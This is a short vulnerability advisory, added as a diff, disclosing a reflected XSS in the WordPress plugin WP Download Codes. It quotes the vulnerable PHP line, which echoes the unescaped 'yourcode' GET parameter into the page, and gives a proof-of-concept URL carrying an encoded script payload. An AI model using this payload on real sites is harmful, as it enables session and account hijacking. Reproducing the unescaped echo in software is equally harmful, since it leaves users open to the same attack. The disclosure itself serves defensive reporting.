@@ -1,0 +1,26 @@
+Reflected XSS in WP Download Codes
+----------------------------------
+
+*About*
+
+> The plugin enables to generation and management of download codes for different types of files (zip, mp3, ...).
+> It was mainly written to enable the download of digital-only releases or of soundfiles complementary to Vinyl records or CDs using dedicated download codes. Such codes could be printed on the release covers or on separate download cards or simply distributed via email.
+
+
+*Author*: [Blog post](http://www.misantropolis.de/2009/08/wp-download-codes/)
+
+*Timeline*
+
+* 2016-07-15: Vendor Notified
+
+*Vulnerability*: The `yourcode` parameter when viewing a download code form allows for XSS. 
+
+    `$html .= dc_msg( 'code_enter' ) .' <input type="text" name="code_' . $shortcode_id . '" value="' . ( $post_code != "" ? $post_code : ( $_GET['yourcode'] != "" ? $_GET['yourcode'] : "" ) ) . '" size="20" /> ';`
+
+*Proof of Concept*: Altering the url would allow for the XSS to be executed
+
+`http://wordpress.site/download-code/?yourcode=%22%3E%3Cscript%20src=data:%26comma;alert(1)//`
+
+would execute `alert(1)` but could be used to run something more malicious
+
+*Further Reading*: More information on XSS [here](https://www.owasp.org/index.php/Top_10_2013-A3-Cross-Site_Scripting_\(XSS\))
